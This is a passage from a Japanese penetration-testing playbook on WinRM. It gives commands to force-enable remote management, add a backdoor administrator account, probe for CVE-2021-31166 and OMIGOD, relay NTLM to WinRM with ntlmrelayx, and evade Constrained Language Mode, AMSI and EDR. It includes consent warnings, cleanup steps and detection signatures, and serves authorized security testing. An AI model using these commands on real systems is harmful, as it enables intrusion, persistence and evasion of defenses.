     process call create "powershell enable-psremoting -force"

# [Attacker] PsExec 経由で WinRM 有効化
.\PsExec.exe \\[TARGET_HOST] -u [DOMAIN]\[USER] -p [PASSWORD] -h -d \
     powershell.exe "enable-psremoting -force"
```

### 9.3 WinRM 接続可能ユーザーの追加（バックドア）

```powershell
# [Compromised-Host] 新規ユーザー作成（テスト識別子コメントマーカー付き）
net user kedalab_[CASE_ID] '[STRONG_RANDOM_PASSWORD]' /add /comment:"kedalab-[CASE_ID]"

# [Compromised-Host] Remote Management Users グループ追加（WinRM 接続権限付与）
net localgroup "Remote Management Users" kedalab_[CASE_ID] /add

# [Compromised-Host] Administrators グループ追加（フル権限）
net localgroup Administrators kedalab_[CASE_ID] /add

# [Attacker] 確認
evil-winrm -i [TARGET_IP] -u kedalab_[CASE_ID] -p '[STRONG_RANDOM_PASSWORD]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Enable-PSRemoting -Force` 成功 + listener 表示 | WinRM 有効化完了 | §4 / §6 から接続試行 |
| `net user ... /add` で `アクセスが拒否されました` | 管理者権限不足 | 先に Token Impersonation / UAC バイパスで権限昇格 |
| `Enable-PSRemoting` で「ネットワークの種類が Public」エラー | NetworkCategory が Public でブロック | `Set-NetConnectionProfile -NetworkCategory Private` で変更 |
| ターゲット側 Event Viewer に `Microsoft-Windows-WinRM/Operational` Event 91 (shell created) | 検知側でセッション開始記録 | 検知シグネチャに該当、テスト終了後の `Disable-PSRemoting` で原状回復 |

> **原状回復（必須）:**
>
> ```powershell
> # [Target] テスト終了時に実施
> # 追加したユーザーを削除
> net localgroup "Remote Management Users" kedalab_[CASE_ID] /delete
> net localgroup Administrators kedalab_[CASE_ID] /delete
> net user kedalab_[CASE_ID] /delete
> # 有効化した WinRM を元に戻す（元から有効だった場合は実施しない）
> Disable-PSRemoting -Force
> Stop-Service WinRM
> Set-Service WinRM -StartupType Manual
> Remove-NetFirewallRule -DisplayGroup "Windows Remote Management"
> ```

> **検知シグネチャ:** `Enable-PSRemoting` 実行は PowerShell ScriptBlock ロギング（Event ID 4104）で本文が記録される。Event ID 4697（サービスインストール）も WinRM サービス開始時に発火。**原状回復しても痕跡は残る**ため、テスト識別子コメントマーカー（`/comment:"kedalab-[CASE_ID]"`）で識別可能にする運用が重要。

---

## 10. 既知 CVE と高度な攻撃

### 10.1 CVE-2021-31166（HTTP Protocol Stack RCE）

**着火条件:** ターゲットが Windows 10 / Server バージョン 2004 / 20H2 / 21H1 で HTTP.sys のパッチ未適用（KB5003173 以前）。WinRM は http.sys を共有しているため、5985 経路でも理論上影響する（Microsoft 公式アドバイザリで HTTP.sys を使う任意のサービスが対象と明記）。

> **[HIGH IMPACT]** 公開されている PoC は **BSOD（カーネルクラッシュ）のみ確認**、安定した RCE は実証されていない。バージョン該当の確認まで（OS バージョン取得）は技術的判断で実施可。実 exploit は事前合意必須。

```bash
# [Attacker] OS バージョン該当の確認
nxc smb [TARGET_IP]
# SMB    [TARGET_IP]    445    [HOSTNAME]    [*] Windows 10 / Server x64 (build:19041.xxxx)

searchsploit CVE-2021-31166
# 公開 PoC は BSOD トリガのみ（DoS 相当）
```

| OS バージョン | 影響 | 対応 |
|---|---|---|
| Windows 10 / Server 2004 / 20H2 / 21H1 ビルド 19041.* / 19042.* / 19043.* （古い revision） | 対象範囲 | バージョン該当を audit finding として記録 |
| Windows 11 / Server 2022 / Windows 10 21H2+ | 影響範囲外 | 別経路へ |

### 10.2 CVE-2021-38647 — OMIGOD（Azure OMI Unauth RCE）

**着火条件:** ターゲットが Azure 上の Linux VM で **Open Management Infrastructure (OMI)** サービスが稼働し、5985 / 5986 を露出している。

> **[HIGH IMPACT]** 認証なし RCE as root。本番では事前合意必須。

```bash
# [Attacker] 確認（5985 を Linux OS のホストで見つけた場合は OMI を疑う）
curl http://[TARGET_IP]:5985/wsman -H 'Content-Type:text/xml' -d '<xml ... />'
# 認証ヘッダーなしの XML POST で RCE が走る（PoC 自体は脆弱な実装のロジックエラーを突く）
```

| バージョン | 対応 |
|---|---|
| OMI < 1.6.8-1 | 脆弱（パッチ前） |
| OMI ≥ 1.6.8-1 | パッチ済み |

> **重要:** 5985 で **Linux OS** を見たら OMIGOD を最優先で確認。通常 WinRM は Windows のみだが、Azure Linux Agent の OMI が同じポートを使うため見落としやすい。

### 10.3 NTLM Relay to WinRM（Impacket 0.11+ / 2023 年〜）

**着火条件:** 攻撃側で `mitm6` / `Responder` で NTLM 認証をキャプチャ可能、かつターゲット側 WinRM が **HTTP 5985（未暗号化）** で listener を持っている。

> **[HIGH IMPACT]** Relay 攻撃は SYSTEM レベル RCE。本番では事前合意必須。

```bash
# [Attacker] ntlmrelayx で WS-MAN/WinRM へ relay（Impacket 0.11 以降）
sudo ntlmrelayx.py -t wsman://[TARGET_IP] --no-smb-server -smb2support \
                   --command "net user kedalab_[CASE_ID] [STRONG_RANDOM_PASSWORD] /add"
# mitm6 or Responder で別途認証強制トリガを動かす
```

**緩和策（finding 用）:**

- `Set-Item WSMan:\localhost\Service\EnableCompatibilityHttpListener -Value false` で HTTP listener を無効化
- HTTPS（5986）強制 + **EPA (Extended Protection for Authentication)** 有効化
- 詳細は `../04_Post_Access_Windows_AD/NTLM_Relay/ntlmrelayx.md` を参照

### 10.4 WSMan.Automation COM Abuse（Constrained Language Mode 回避）

**着火条件:** ターゲット側で PowerShell が **Constrained Language Mode** に制限されている / EDR で PowerShell 実行が検知される。WinRM を **PowerShell を使わずに駆動**したい。

```powershell
# [Compromised-Host] PowerShell の COM Object を使って WinRM を呼ぶ
$ws = New-Object -ComObject 'WSMan.Automation'
$session = $ws.CreateSession('http://[TARGET_FQDN]:5985/wsman', 0, $null)
$cmdId = $session.Command('cmd.exe', @('/c', 'whoami'))
$session.Signal($cmdId, 0)
```

> 実行チェーン（`svchost → wmiprvse → cmd.exe`）は classic PS-Remoting と同じ。COM Abuse 専用ツール `SharpWSManWinRM` がある。**defense evasion 観点で価値あり**（PowerShell 経路を回避できる）。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| 5985 / 5986 が両方とも閉じている | WinRM 自体が無効化（既定で無効の Server / 強化された環境）| `./Protocol_Exploitation.md` の Impacket exec 経路（135 / 445）に切替、または管理者権限取得後に §9 で強制有効化 |
| 認証成功するが `(Pwn3d!)` 出ない | `Remote Management Users` / `Administrators` グループ外 | BloodHound でグループへの writable ACE を辿る / 別ユーザー探索 |
| `NTLM is disabled on this machine` | NTLM 認証無効化、Kerberos のみ受理 | `kinit` で TGT 取得 → `evil-winrm -k --spn HTTP/[TARGET_FQDN]` |
| `STATUS_ACCOUNT_LOCKED_OUT` が頻発 | スプレー設計失敗 | `Account_Lockout_Recon.md` で観察期間 +buffer 再設計、Linux PAM 系 / Web フォーム経路に切替も検討 |
| evil-winrm が接続できるが PowerShell 出力が文字化け | コードページ不整合（既定で UTF-8 vs CP932 等）| `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8` を最初に実行 |
| `Invoke-Binary` が Defender でブロック | AMSI / リアルタイム保護有効 | `Bypass-4MSI` 実行（evil-winrm 内蔵）、または別経路でメモリ実行 |
| 接続後、特定コマンドだけがハング | 対話入力を要するコマンド（GUI / 確認プロンプト）| 引数で完結する形に書き換え、または別経路（RDP）|
| Kerberos 接続で `KRB_AP_ERR_MODIFIED` | SPN 不一致（IP 直打ちで Kerberos 不可）| `evil-winrm -i [TARGET_FQDN]`（FQDN 必須）、`/etc/hosts` 登録 → `../06_Concepts/Hosts_File_For_AD.md` |
| Windows ネイティブで `TrustedHosts` エラー | 攻撃側マシンの WSMan クライアント設定 | `winrm quickconfig` + `winrm set winrm/config/client '@{TrustedHosts="..."}'` |
| Lateral movement で `\\[NEXT_HOP]\share` アクセスが Access Denied | 二重ホップ問題 | `-Authentication CredSSP` / RBCD / Pass-The-Ticket で回避（§7）|
| evil-winrm が EDR で検知される | カスタム Ruby クライアント特有のシグネチャ | §6 Windows ネイティブ経路 / §10.4 WSMan.Automation COM Abuse / pypsrp に切替 |

## 注意点・落とし穴

> **[HIGH IMPACT]** §8 認証スプレーは以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（アカウントロック発動）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM / EDR で確実に検知される（Event ID 4625 大量、`Microsoft-Windows-WinRM/Operational` 失敗ログ Event 182、Security Event 4262 で source IP 記録）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> **[HIGH IMPACT]** §9 WinRM 強制有効化 / Persistence は **持続化に該当 + 不可逆な設定変更**。テスト終了時の原状回復（`Disable-PSRemoting` + 追加ユーザー削除 + FW 規則削除）必須。詳細は §9 内警告ブロック参照。

> **[HIGH IMPACT]** §10 各 CVE / 高度攻撃の実 exploit は事前合意必須（10.1 BSOD リスク・10.2 unauth RCE・10.3 SYSTEM RCE）。バージョン該当の確認まで（OS バージョン取得・OMI バージョン確認）は技術的判断で実施可。

> **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロックを横断する高影響の警告のみを置く。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — §8 認証スプレー / §9 WinRM 強制有効化 / §10 各 CVE 実 exploit）/ ★★（口頭確認可 — §4 evil-winrm シェル取得は侵入後活動の起点 / §6 Windows ネイティブ経路 / §7 Lateral movement は cred 委任で影響範囲が広がる）/ ★（§1-§3 のバナー・認証方式・nxc 認証確認は技術的判断のみで実施可だが、対象組織との合意範囲は確認）
- **想定される SIEM / EDR 検知**:
  - Event ID 4624（LogonType 3 ネットワーク経由）/ Event ID 4625（認証失敗）
  - `Microsoft-Windows-WinRM/Operational` ログ: Event 91 / 163（shell created）、Event 182（認証失敗）
  - Security Event 4262（source IP 記録・2022 年 7 月 CU 以降）
  - Sysmon Event ID 1（ターゲット側 `wsmprovhost.exe` 子プロセス）
  - PowerShell ScriptBlock ロギング（Event ID 4104）
  - §8 スプレー時は閾値ベース検知（Splunk / Sentinel の brute-force ルール）
  - §9 `Enable-PSRemoting` の ScriptBlock 記録 + Event 4697 サービス作成
- **業務影響リスク**: §8 スプレーでのアカウントロック発生時の業務影響（管理者アカウントなら系統的影響）、§10.1 CVE-2021-31166 実 exploit 時の BSOD（サービス停止）、§9 で `Disable-PSRemoting` 失敗時の管理経路喪失
- **原状回復必須項目**:
  - ✅ §4 / §6 で `upload` した PE / スクリプトの削除（テスト識別子コメントマーカー `kedalab-[CASE_ID]` で grep 削除）
  - ✅ §5 で AMSI バイパスした PowerShell セッションの終了（exit で消える）
  - ✅ §6 攻撃側マシンの TrustedHosts 設定の元復元
  - ✅ §7 で確立した PSSession (`Remove-PSSession`)
  - ✅ §9 で有効化した WinRM の無効化 + 追加ユーザー削除 + FW 規則削除
  - ✅ 取得した認証情報・ハッシュ・Kerberos チケットの安全な破棄
- **取得情報の取扱**: シェル経由で取得したファイルはテスト完了時に破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

> **WinRM 接続後の AD 列挙・横展開はこのファイルの範囲外** → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`。BloodHound 起動 / Kerberos 攻撃 / DCSync 等は `../00_Playbook/Windows_AD_Attack_Flow.md` の Step 4 以降。

## 関連技術

- 前：5985 / 5986 ポートの発見 → `../01_Reconnaissance/Network_Scanning.md`
- 前：認証情報の取得 → `Credential_Discovery.md`
- 前：ロックアウト設定の事前確認 → `Account_Lockout_Recon.md`
- 前：製品出荷時のデフォルト認証情報試行 → `Default_Credentials.md`
- 前：Kerberos チケット取得（NTLM 無効化環境）→ `../04_Post_Access_Windows_AD/Kerberos_Attacks/Pass_The_Ticket.md`
- 後：シェル取得後の Windows / AD 列挙 → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
- 後：BloodHound で AD 全体把握 → `../05_Tools_Reference/BloodHound.md`
- 後：SeImpersonate / SeAssignPrimaryToken 経由の SYSTEM 昇格 → `../04_Post_Access_Windows_AD/Privilege_Tokens.md`
- 後：DCSync 経由の全ハッシュ取得 → `../04_Post_Access_Windows_AD/Credential_Dumping.md`
- 後（§10.3 NTLM Relay 詳細）：→ `../04_Post_Access_Windows_AD/NTLM_Relay/ntlmrelayx.md` / mitm6 トリガは `../04_Post_Access_Windows_AD/NTLM_Relay/mitm6.md`
- 関連：WinRM が閉じている場合の Impacket exec（wmiexec / psexec / smbexec）→ `./Protocol_Exploitation.md`
- 関連：他プロトコルでの認証情報使い回し → `SSH.md` / `FTP.md` / `Mail_Services.md`
- 関連：ツールリファレンス（nxc）→ `../05_Tools_Reference/Netexec.md`
- 関連：AD 環境での hosts ファイル設定（Kerberos 認証で必須）→ `../06_Concepts/Hosts_File_For_AD.md`
- 関連：WinRM / WS-Management の動作原理（プロセスモデル / 認証 negotiation / 二重ホップ）→ `../06_Concepts/WinRM_Protocol.md`
